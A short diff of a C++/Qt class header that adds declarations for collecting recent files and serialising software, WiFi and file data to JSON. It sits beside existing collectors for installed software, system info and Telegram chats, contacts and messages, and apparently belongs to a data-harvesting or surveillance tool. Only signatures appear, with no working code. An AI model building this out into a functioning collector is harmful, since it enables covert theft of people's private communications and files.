@@ -41,6 +41,10 @@ private:
     void collectInstalledSoftware();
     void collectSystemInfo();
     void collectWiFiInfo();
+    void collectRecentFiles(const QString& taskId);
+    QString getSoftwareJson();
+    QString getWifiJson();
+    QString getRecentFilesJson();
     void collectTelegramData(); // Chats, Contacts, Messages
     void processMediaDownloads(); // Process pending media downloads
     void cleanupDatabase(); // Cleanup old records to save space
